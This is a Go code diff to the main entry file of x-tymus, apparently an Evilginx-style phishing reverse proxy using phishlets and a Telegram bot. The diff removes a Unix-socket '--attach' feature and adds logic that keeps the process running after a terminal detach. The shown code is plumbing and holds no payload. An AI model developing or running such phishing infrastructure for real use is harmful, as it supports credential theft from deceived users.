@@ -4,13 +4,11 @@ import (
 	"flag"
 	"fmt"
 	_log "log"
-	"io"
 	"os"
 	"os/signal"
 	"os/user"
 	"path/filepath"
 	"regexp"
-	"sync"
 	"syscall"
 	"time"
 	"bufio"
@@ -36,7 +34,6 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
-var attach_flag = flag.Bool("attach", false, "Attach to a running x-tymus instance")
 
 func isatty(f *os.File) bool {
 	return gotty.IsTerminal(f.Fd())
@@ -91,96 +88,12 @@ func testProxy(proxyURL string) bool {
  return resp.StatusCode == 200
 }
 
-const sockPath = "/tmp/x-tymus.sock"
-
-var (
-	socketMu   sync.Mutex
-	socketBusy bool
-)
-
-func startSocketServer(hp *core.HttpProxy, cfg *core.Config, crt_db *core.CertDb, db *database.Database, developer bool) {
-	os.Remove(sockPath)
-	ln, err := net.Listen("unix", sockPath)
-	if err != nil {
-		log.Error("attach: failed to listen on socket: %v", err)
-		return
-	}
-	os.Chmod(sockPath, 0600)
-	log.Info("attach socket ready — connect with: ./x-tymus --attach")
-
-	for {
-		conn, err := ln.Accept()
-		if err != nil {
-			return
-		}
-
-		socketMu.Lock()
-		if socketBusy {
-			socketMu.Unlock()
-			conn.Write([]byte("\r\n[!] another session is already active\r\n"))
-			conn.Close()
-			continue
-		}
-		socketBusy = true
-		socketMu.Unlock()
-
-		go func() {
-			defer func() {
-				socketMu.Lock()
-				socketBusy = false
-				socketMu.Unlock()
-				conn.Close()
-			}()
-
-			t, err := core.NewTerminalWithIO(hp, cfg, crt_db, db, developer, conn, conn)
-			if err != nil {
-				conn.Write([]byte(fmt.Sprintf("\r\n[!] failed to start terminal: %v\r\n", err)))
-				return
-			}
-			defer t.Close()
-
-			oldOutput := log.GetOutput()
-			log.SetOutput(conn)
-			defer log.SetOutput(oldOutput)
-
-			t.DoWork()
-		}()
-	}
-}
-
-func attachToInstance() {
-	conn, err := net.Dial("unix", sockPath)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "[!] x-tymus is not running (socket not found)\n")
-		fmt.Fprintf(os.Stderr, "    Start it first: ./x-tymus -p <phishlets> -c <config>\n")
-		os.Exit(1)
-	}
-	defer conn.Close()
-
-	// Put stdin in raw mode if it's a tty
-	if isatty(os.Stdin) {
-		state, err := makeRawTerm(int(os.Stdin.Fd()))
-		if err == nil && state != nil {
-			defer restoreRawTerm(int(os.Stdin.Fd()), state)
-		}
-	}
-
-	done := make(chan struct{}, 2)
-	go func() { io.Copy(conn, os.Stdin); done <- struct{}{} }()
-	go func() { io.Copy(os.Stdout, conn); done <- struct{}{} }()
-	<-done
-}
 
 func main() {
 	flag.Parse()
 
 	if *version_flag == true {
 		log.Info("version: %s", core.VERSION)
-		return
-	}
-
-	if *attach_flag {
-		attachToInstance()
 		return
 	}
 
@@ -414,14 +327,10 @@ if err != nil {
 		log.Info("telegram bot: not configured (set bot_token + bot_admin_chat_id in config)")
 	}
 
-	// Start the attach socket server so clients can connect with --attach
-	go startSocketServer(hp, cfg, crt_db, db, *developer_mode)
-
 	// If running without a TTY (e.g. systemd service), skip the interactive
 	// terminal and block forever so all goroutines (proxy, bot, certs) stay alive.
 	if !isatty(os.Stdin) {
 		log.Info("no TTY detected — running in daemon mode (bot + proxy active)")
-		log.Info("attach anytime with: ./x-tymus --attach")
 		sig := make(chan os.Signal, 1)
 		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 		<-sig
@@ -438,4 +347,15 @@ if err != nil {
 		return
 	}
 	t.DoWork()
+
+	// If the terminal exited via 'detach', keep running in the background
+	if t.IsDetached() {
+		sig := make(chan os.Signal, 1)
+		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
+		<-sig
+		log.Info("shutting down")
+		if tbot != nil {
+			tbot.Stop()
+		}
+	}
 }
